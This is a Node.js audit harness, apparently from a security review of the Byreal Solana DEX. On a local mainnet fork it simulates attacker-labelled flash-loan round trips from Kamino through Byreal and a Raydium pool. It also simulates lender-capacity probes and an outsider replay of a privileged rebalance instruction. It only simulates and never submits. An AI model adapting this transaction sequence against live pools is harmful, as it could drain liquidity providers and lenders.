#!/usr/bin/env node
'use strict';

// Read-only current-mainnet-backed fork harness. It constructs and signs the
// exact custom Solana transaction-v1 wire format, then only calls
// simulateTransaction(sigVerify:true). It never submits a transaction.
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');
const MODULES = '/Users/stacc/Documents/Codex/2026-10-15/goonfi-daybreak-audit/work/audit-tools/node_modules/';
const {Keypair, PublicKey, SystemProgram, TransactionInstruction} =
  require(MODULES + '@solana/web3.js');
const spl = require(MODULES + '@solana/spl-token');
const bs58Module = require(MODULES + 'bs58');
const bs58 = bs58Module.default || bs58Module;
const {encodeV1, signV1} = require('./hylo-exchange-v1-wire.js');

const ROOT = __dirname;
const OUTPUT = path.join(ROOT, 'byreal-signed-cross-pool-maxflash-v4.json');
const FORK = process.env.BYREAL_FORK_RPC || 'http://127.0.0.1:19097';
const P = value => new PublicKey(value);
const BYREAL = P('REALQqNEomY6cQGZJUGwywTBD2UmDT32rZcNnfxQ5N2');
const RAYDIUM = P('CAMMCzo5YL8w4VFF8KVHrK22GGUsp5VTaW7grrKgrWqK');
const KLEND = P('KLend2g3cP87fffoy8q1mQqGKjrxjC8boSyAYavgmjD');
const TOKEN = spl.TOKEN_PROGRAM_ID;
const TOKEN_2022 = spl.TOKEN_2022_PROGRAM_ID;
const USDC = P('EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v');
const CRCL = P('XsueG8BtpquVJX9LVLLEGuViXUungE6WmK5YZ3p3bd1');
const POOL_A = P('Hv44BZaqT5URrrAtGk6jvfbWKL2PytWA4ur2r1QnvtQa');
const POOL_A_USDC = P('5JcntpKHEy2vyjCiiLY5e4Te1ZVG1zU6pp6ZU667d6tw');
const POOL_A_CRCL = P('8feVD1rbhaE17kZiWhTssFrC75DUoJUCX9SLZ6C9oxhd');
const POOL_B = P('GYqHjuDzTiw7i52Xv1qohDE6eJr6eSZpsrBVikGZyaFV');
const POOL_B_CRCL = P('DMQver7kdMua1ANBY1rJPEFCX594zWn81ihv2yMVFEsF');
const POOL_B_USDC = P('8awg4iLSUmmmrkUGgj3T8VuWyvHRPudsLz8skyb3xV92');
const BYREAL_SIGNATURE = '3Pd2Li7YKLJfQC3HDqi48TBu1P5zg52V8UNczoL2u5tha2ErcCMXceHvVtDmM7hTroZEgEt9j6n96DmRRj9Sdvq3';
const RAYDIUM_SIGNATURE = '3mnyio88VKfNYtPcymMvPtB7AQzFvta7MF7Z8UWwzFUpbndHrM32MT9KH1GydBn2W28RckadpKXtBLEonNW2GhEt';
const REBALANCE_SIGNATURE = '5DnzTGPMdakorV388SHPtSw4Yx7pvzYgVnajnAfUGTUVW5idbK9EfKZcqeLeaaFD5zqZF3Yet827ZJfUvFJdfpML';
const REBALANCER = P('BYrEa363GeActic949HkNmw7VGBf9k7awKEqCTZvPuT4');

const USDC_RESERVE = {
  reserve: 'AYL4LMc4ZCVyq3Z7XPJGWDM4H9PiWjqXAAuuHBEGVR2Z',
  market: '47tfyEG9SsdEnUm9cw5kY9BXngQGqu3LBoop9j5uTAv8',
  supplyVault: '8BkQTZsT8ssKMU643De4iiV5Wf3pENdUFTsdtHPueKjB',
  feeVault: '5iLRav31Y7DJwM6bZ7s92jqvV3zd1wZMcp4mYeKXh8cj',
  censusAvailableRaw: '7868315584088',
};

function readEnv() {
  const file = ['/tmp/composer-helius-rpc.env', '/tmp/composer-helius-only.env'].find(fs.existsSync);
  if (!file) throw new Error('authenticated RPC environment file unavailable');
  return Object.fromEntries(fs.readFileSync(file, 'utf8').split(/\r?\n/)
    .filter(line => /^[A-Za-z_][A-Za-z0-9_]*=/.test(line))
    .map(line => line.split(/=(.*)/s).slice(0, 2)));
}
const ENV = readEnv();
const UPSTREAMS = [...new Set([ENV.RPC_URL, ENV.HEAVY_RPC_URL].filter(Boolean))];
let rpcId = 0;
async function rpc(url, method, params) {
  let last;
  for (let attempt = 0; attempt < 2; attempt += 1) {
    try {
      const response = await fetch(url, {method: 'POST', headers: {'content-type': 'application/json'},
        signal: AbortSignal.timeout(12_000),
        body: JSON.stringify({jsonrpc: '2.0', id: ++rpcId, method, params})});
      const body = await response.json();
      if (body.error) throw new Error(`${method}: ${JSON.stringify(body.error)}`);
      return body.result;
    } catch (error) {
      last = error;
      if (String(error.message).startsWith(`${method}:`)) throw error;
      await new Promise(resolve => setTimeout(resolve, 200 * (attempt + 1)));
    }
  }
  throw last;
}
async function upstream(method, params) {
  const errors = [];
  for (const endpoint of UPSTREAMS) {
    try { return await rpc(endpoint, method, params); }
    catch (error) { errors.push(error.message); }
  }
  throw new Error(`${method}: all upstreams failed: ${errors.join('; ')}`);
}
const fork = (method, params) => rpc(FORK, method, params);
const sha256 = data => crypto.createHash('sha256').update(data).digest('hex');

function fixedKeypair(label) {
  return Keypair.fromSeed(crypto.createHash('sha256').update(`byreal-audit:${label}`).digest());
}
function cloneIx(ix) {
  return new TransactionInstruction({programId: ix.programId,
    keys: ix.keys.map(key => ({...key})), data: Buffer.from(ix.data)});
}
function rawHistoricalIx(tx, instructionIndex) {
  const message = tx.transaction.message;
  const staticKeys = message.accountKeys.map(key => typeof key === 'string' ? key : key.pubkey);
  const loaded = tx.meta.loadedAddresses || {writable: [], readonly: []};
  const keys = [...staticKeys, ...loaded.writable, ...loaded.readonly];
  const h = message.header;
  const writable = index => index < staticKeys.length
    ? (index < h.numRequiredSignatures
      ? index < h.numRequiredSignatures - h.numReadonlySignedAccounts
      : index < staticKeys.length - h.numReadonlyUnsignedAccounts)
    : index < staticKeys.length + loaded.writable.length;
  const source = message.instructions[instructionIndex];
  return new TransactionInstruction({programId: P(keys[source.programIdIndex]),
    keys: source.accounts.map(index => ({pubkey: P(keys[index]),
      isSigner: index < h.numRequiredSignatures, isWritable: writable(index)})),
    data: Buffer.from(bs58.decode(source.data))});
}
function parsedIx(tx, source) {
  const meta = new Map(tx.transaction.message.accountKeys.map(key => [key.pubkey,
    {isSigner: Boolean(key.signer), isWritable: Boolean(key.writable)}]));
  return new TransactionInstruction({programId: P(source.programId),
    keys: source.accounts.map(address => ({pubkey: P(address), ...(meta.get(address) ||
      {isSigner: false, isWritable: true})})), data: Buffer.from(bs58.decode(source.data))});
}
function replaceKeys(ix, replacements) {
  return new TransactionInstruction({programId: ix.programId,
    keys: ix.keys.map(key => ({...key, pubkey: replacements.get(key.pubkey.toBase58()) || key.pubkey})),
    data: Buffer.from(ix.data)});
}
function swapExactIn(ix, amount) {
  const out = cloneIx(ix);
  if (out.data.length !== 41) throw new Error(`unexpected SwapV2 length ${out.data.length}`);
  out.data.writeBigUInt64LE(BigInt(amount), 8);
  out.data.writeBigUInt64LE(0n, 16);
  out.data[40] = 1;
  return out;
}

function klendTemplate(instructionIndex) {
  const source = JSON.parse(fs.readFileSync(path.join(ROOT, 'kamino-flash-history.json'), 'utf8'))
    .hits[0].transaction;
  return rawHistoricalIx(source, instructionIndex);
}
function klendFlashIx(template, authority, userUsdc, amount, repayIndex) {
  const market = P(USDC_RESERVE.market);
  const lma = PublicKey.findProgramAddressSync([Buffer.from('lma'), market.toBuffer()], KLEND)[0];
  const out = cloneIx(template);
  const replacements = {0: authority, 1: lma, 2: market, 3: P(USDC_RESERVE.reserve),
    4: USDC, 5: P(USDC_RESERVE.supplyVault), 6: userUsdc,
    7: P(USDC_RESERVE.feeVault), 8: KLEND, 9: KLEND, 11: TOKEN};
  for (const [index, pubkey] of Object.entries(replacements)) out.keys[Number(index)].pubkey = pubkey;
  out.data.writeBigUInt64LE(BigInt(amount), 8);
  if (repayIndex !== undefined) out.data[16] = repayIndex;
  return out;
}

async function tokenTemplate(address, authority, amount) {
  const row = await upstream('getAccountInfo', [address, {encoding: 'base64', commitment: 'confirmed'}]);
  const data = Buffer.from(row.value.data[0], 'base64');
  authority.toBuffer().copy(data, 32);
  data.writeBigUInt64LE(BigInt(amount), 64);
  return {data: data.toString('hex'), executable: false, lamports: row.value.lamports,
    owner: row.value.owner, rentEpoch: 0};
}
async function createActor(label, initialUsdc) {
  const signer = fixedKeypair(label);
  const usdc = spl.getAssociatedTokenAddressSync(USDC, signer.publicKey, false, TOKEN);
  const crcl = spl.getAssociatedTokenAddressSync(CRCL, signer.publicKey, false, TOKEN_2022);
  await fork('surfnet_setAccount', [signer.publicKey.toBase58(), {data: '', executable: false,
    lamports: 10_000_000_000, owner: SystemProgram.programId.toBase58(), rentEpoch: 0}]);
  await fork('surfnet_setAccount', [usdc.toBase58(),
    await tokenTemplate('ArwpdfBciGYoxVFbJKKqEmhLbtCjZk9sy9Be3VLvrUtL', signer.publicKey, initialUsdc)]);
  await fork('surfnet_setAccount', [crcl.toBase58(),
    await tokenTemplate('5AK1cujgbvgfSxpQ2HphKKfGhdPnQLTKHBRgtktDiPLt', signer.publicKey, 0n)]);
  return {signer, usdc, crcl, initialUsdc: BigInt(initialUsdc)};
}
function tokenAmount(account) {
  if (!account?.data) return null;
  const data = Buffer.from(account.data[0], 'base64');
  return data.length >= 72 ? data.readBigUInt64LE(64) : null;
}
function image(account) {
  if (!account) return null;
  const data = Buffer.from(account.data[0], 'base64');
  return {owner: account.owner, lamports: String(account.lamports), dataLength: data.length,
    dataSha256: sha256(data), tokenAmountRaw: data.length >= 72 ? data.readBigUInt64LE(64).toString() : null};
}
async function preload(instructions, extra = []) {
  const unique = [...new Set([...instructions.flatMap(ix => [ix.programId, ...ix.keys.map(k => k.pubkey)]),
    ...extra].map(String))];
  for (let offset = 0; offset < unique.length; offset += 12) {
    await Promise.all(unique.slice(offset, offset + 12).map(address =>
      fork('getAccountInfo', [address, {encoding: 'base64', commitment: 'processed'}])));
  }
}
async function simulate(label, actor, instructions, watched, metadata = {}) {
  await preload(instructions, watched.map(row => row.pubkey));
  const beforePage = await fork('getMultipleAccounts', [watched.map(row => String(row.pubkey)),
    {encoding: 'base64', commitment: 'processed'}]);
  const blockhash = (await fork('getLatestBlockhash', [{commitment: 'processed'}])).value.blockhash;
  let encoded;
  try { encoded = encodeV1(instructions, actor.signer.publicKey, blockhash); }
  catch (error) { return {label, localCompositionError: error.message, ...metadata}; }
  const signed = signV1(encoded, instructions, actor.signer.publicKey, blockhash, [actor.signer]);
  const response = await fork('simulateTransaction', [signed.wire.toString('base64'), {
    encoding: 'base64', sigVerify: true, replaceRecentBlockhash: false,
    commitment: 'processed', innerInstructions: true,
    accounts: {encoding: 'base64', addresses: watched.map(row => String(row.pubkey))},
  }]);
  const before = Object.fromEntries(watched.map((row, index) => [row.label, image(beforePage.value[index])]));
  const after = Object.fromEntries(watched.map((row, index) => [row.label, image(response.value.accounts?.[index])]));
  const deltas = {};
  for (const row of watched) {
    const a = before[row.label]?.tokenAmountRaw;
    const b = after[row.label]?.tokenAmountRaw;
    deltas[row.label] = a !== null && a !== undefined && b !== null && b !== undefined
      ? (BigInt(b) - BigInt(a)).toString()
      : before[row.label]?.dataSha256 === after[row.label]?.dataSha256 ? 'unchanged' : 'changed';
  }
  const result = {label, forkBaselineSlot: beforePage.context.slot, simulationSlot: response.context.slot,
    err: response.value.err, sigVerify: true, signerOrder: signed.signerOrder,
    wire: {version: 1, sizeBytes: encoded.sizeBytes, maximumBytes: 4096,
      addressCount: encoded.addressCount, maximumAddresses: 64,
      instructionCount: encoded.instructionCount, requiredSignatures: encoded.requiredSignatures,
      sha256: sha256(signed.wire)}, unitsConsumed: response.value.unitsConsumed,
    loadedAccountsDataSize: response.value.loadedAccountsDataSize, before, after, deltas,
    logs: response.value.logs, ...metadata};
  process.stdout.write(JSON.stringify({label, err: result.err, wire: result.wire,
    units: result.unitsConsumed, deltas: {attackerUsdc: deltas.attackerUsdc,
      attackerCrcl: deltas.attackerCrcl, poolAUsdc: deltas.poolAUsdc,
      poolACrcl: deltas.poolACrcl, poolBCrcl: deltas.poolBCrcl,
      poolBUsdc: deltas.poolBUsdc, lenderSupply: deltas.lenderSupply},
    tail: result.logs?.slice(-5)}) + '\n');
  return result;
}

async function currentTemplates() {
  const [byreal, raydium, rebalance] = await Promise.all([
    upstream('getTransaction', [BYREAL_SIGNATURE, {encoding: 'jsonParsed', commitment: 'confirmed', maxSupportedTransactionVersion: 1}]),
    upstream('getTransaction', [RAYDIUM_SIGNATURE, {encoding: 'jsonParsed', commitment: 'confirmed', maxSupportedTransactionVersion: 1}]),
    upstream('getTransaction', [REBALANCE_SIGNATURE, {encoding: 'json', commitment: 'confirmed', maxSupportedTransactionVersion: 1}]),
  ]);
  const byrealSource = byreal.transaction.message.instructions.find(ix => ix.programId === BYREAL.toBase58());
  const raydiumSource = raydium.meta.innerInstructions.flatMap(row => row.instructions)
    .find(ix => ix.programId === RAYDIUM.toBase58());
  const rebalanceIndex = rebalance.transaction.message.instructions.findIndex(ix =>
    P([...rebalance.transaction.message.accountKeys.map(key => typeof key === 'string' ? key : key.pubkey),
      ...(rebalance.meta.loadedAddresses?.writable || []), ...(rebalance.meta.loadedAddresses?.readonly || [])][ix.programIdIndex]).equals(REBALANCER));
  if (!byrealSource || !raydiumSource || rebalanceIndex < 0) throw new Error('live instruction template unavailable');
  return {byreal: parsedIx(byreal, byrealSource), raydium: parsedIx(raydium, raydiumSource),
    rebalance: rawHistoricalIx(rebalance, rebalanceIndex),
    slots: {byreal: byreal.slot, raydium: raydium.slot, rebalance: rebalance.slot}};
}
function actorSwaps(templates, actor) {
  const a = replaceKeys(templates.byreal, new Map([
    ['Hasda78TSaT9bjiPxDBvP4GpohFpP3TDTaJEcCYK5kyN', actor.signer.publicKey],
    ['ArwpdfBciGYoxVFbJKKqEmhLbtCjZk9sy9Be3VLvrUtL', actor.usdc],
    ['5AK1cujgbvgfSxpQ2HphKKfGhdPnQLTKHBRgtktDiPLt', actor.crcl],
  ]));
  const sourcePayer = templates.raydium.keys.find(key => key.isSigner)?.pubkey.toBase58();
  const b = replaceKeys(templates.raydium, new Map([
    [sourcePayer, actor.signer.publicKey],
    ['J44wFy7zLQ8yqfe5aMoPFuZJ5G7QWJt3Q7pHQPwT6Hs2', actor.crcl],
    ['9GL8qX8tppzG9BLVM87Va1BetoBMjCzbmqjXAHAG1HE', actor.usdc],
  ]));
  return {a, b};
}
function watched(actor) {
  return [
    {label: 'attackerUsdc', pubkey: actor.usdc}, {label: 'attackerCrcl', pubkey: actor.crcl},
    {label: 'poolAUsdc', pubkey: POOL_A_USDC}, {label: 'poolACrcl', pubkey: POOL_A_CRCL},
    {label: 'poolBCrcl', pubkey: POOL_B_CRCL}, {label: 'poolBUsdc', pubkey: POOL_B_USDC},
    {label: 'lenderSupply', pubkey: P(USDC_RESERVE.supplyVault)},
    {label: 'lenderFee', pubkey: P(USDC_RESERVE.feeVault)},
    {label: 'lenderReserve', pubkey: P(USDC_RESERVE.reserve)},
    {label: 'poolAState', pubkey: POOL_A}, {label: 'poolBState', pubkey: POOL_B},
  ];
}
function logAnchorError(result) {
  return result.logs?.find(line => /Error Code:|Error Message:|custom program error/.test(line)) || null;
}

async function main() {
  const templates = await currentTemplates();
  if (!templates.byreal.programId.equals(BYREAL) || !templates.raydium.programId.equals(RAYDIUM))
    throw new Error('wrong swap program fixture');
  const control = await createActor('funded-control', 300_000n * 1_000_000n);
  const flash = await createActor('funded-flash', 300_000n * 1_000_000n);
  const controls = [];
  const controlSwaps = actorSwaps(templates, control);
  const probeAmounts = [1n, 200n * 1_000_000n, 10_000n * 1_000_000n,
    100_000n * 1_000_000n, 200_000n * 1_000_000n, 256_263_056_905n,
    256_263_056_904n, 256_263_056_906n];
  for (const amount of probeAmounts) {
    controls.push(await simulate(`byreal_outsider_exact_in_${amount}`, control,
      [swapExactIn(controlSwaps.a, amount)], watched(control), {inputUsdcRaw: amount.toString()}));
  }

  const flashSwaps = actorSwaps(templates, flash);
  const borrowTemplate = klendTemplate(3);
  const repayTemplate = klendTemplate(13);
  const roundTrips = [];
  for (const amount of [200n * 1_000_000n, 10_000n * 1_000_000n,
    100_000n * 1_000_000n, 200_000n * 1_000_000n]) {
    const preview = controls.find(row => row.inputUsdcRaw === amount.toString());
    const crclOut = BigInt(preview.deltas?.attackerCrcl || '0');
    if (preview.err || crclOut <= 0n) {
      roundTrips.push({label: `cross_pool_${amount}`, skipped: 'Byreal preview failed', previewErr: preview.err});
      continue;
    }
    const loanRaw = 8_229_043_891_243n;
    const borrow = klendFlashIx(borrowTemplate, flash.signer.publicKey, flash.usdc, loanRaw);
    const a = swapExactIn(flashSwaps.a, amount);
    const b = swapExactIn(flashSwaps.b, crclOut);
    const repay = klendFlashIx(repayTemplate, flash.signer.publicKey, flash.usdc, loanRaw, 0);
    roundTrips.push(await simulate(`klend_byreal_raydium_repay_${amount}`, flash,
      [borrow, a, b, repay], watched(flash), {borrowUsdcRaw: loanRaw.toString(),
        moveUsdcRaw: amount.toString(), byrealPreviewCrclOutRaw: crclOut.toString(),
        independentExitPool: POOL_B.toBase58()}));
  }

  const lenderBoundaries = [];
  const currentReservePage = await fork('getMultipleAccounts', [[USDC_RESERVE.reserve, USDC_RESERVE.supplyVault],
    {encoding: 'base64', commitment: 'processed'}]);
  const reserveData = Buffer.from(currentReservePage.value[0].data[0], 'base64');
  const currentAvailable = reserveData.readBigUInt64LE(224);
  for (const amount of [currentAvailable - 1n, currentAvailable, currentAvailable + 1n]) {
    const borrow = klendFlashIx(borrowTemplate, flash.signer.publicKey, flash.usdc, amount);
    const repay = klendFlashIx(repayTemplate, flash.signer.publicKey, flash.usdc, amount, 0);
    lenderBoundaries.push(await simulate(`klend_capacity_${amount}`, flash,
      [borrow, repay], watched(flash), {borrowUsdcRaw: amount.toString()}));
  }

  const signerReplacements = new Map();
  for (const key of templates.rebalance.keys) if (key.isSigner)
    signerReplacements.set(key.pubkey.toBase58(), flash.signer.publicKey);
  const outsiderRebalance = replaceKeys(templates.rebalance, signerReplacements);
  const rebalanceReplay = await simulate('outsider_rebalance_current_accounts', flash,
    [outsiderRebalance], watched(flash), {historicalSignature: REBALANCE_SIGNATURE});

  const output = {
    generatedAt: new Date().toISOString(), scope: 'current-mainnet-backed Surfpool fork; no sendTransaction',
    forkRpc: FORK, sigVerify: true, customTransactionVersion: 1,
    source: {program: BYREAL.toBase58(), programPool: POOL_A.toBase58(),
      independentExitProgram: RAYDIUM.toBase58(), independentExitPool: POOL_B.toBase58(),
      signatures: {byreal: BYREAL_SIGNATURE, raydium: RAYDIUM_SIGNATURE,
        rebalance: REBALANCE_SIGNATURE}, slots: templates.slots},
    actors: {control: control.signer.publicKey.toBase58(), flash: flash.signer.publicKey.toBase58(),
      flashInitialUsdcRaw: flash.initialUsdc.toString(), flashInitialCrclRaw: '0'},
    flashSource: {...USDC_RESERVE, currentSlot: currentReservePage.context.slot,
      currentAvailableRaw: currentAvailable.toString(), reserveAccountDataLength: reserveData.length},
    controls, roundTrips, lenderBoundaries,
    rebalanceReplay: {...rebalanceReplay, extractedError: logAnchorError(rebalanceReplay)},
  };
  fs.writeFileSync(OUTPUT, JSON.stringify(output, null, 2) + '\n');
  process.stdout.write(JSON.stringify({output: OUTPUT, controls: controls.length,
    roundTrips: roundTrips.map(row => ({label: row.label, err: row.err || row.previewErr || null,
      wire: row.wire, extractedError: logAnchorError(row)})),
    lenderBoundaries: lenderBoundaries.map(row => ({label: row.label, err: row.err})),
    rebalance: {err: rebalanceReplay.err, extractedError: logAnchorError(rebalanceReplay)}}) + '\n');
}

main().catch(error => { console.error(error.stack || error); process.exitCode = 1; });
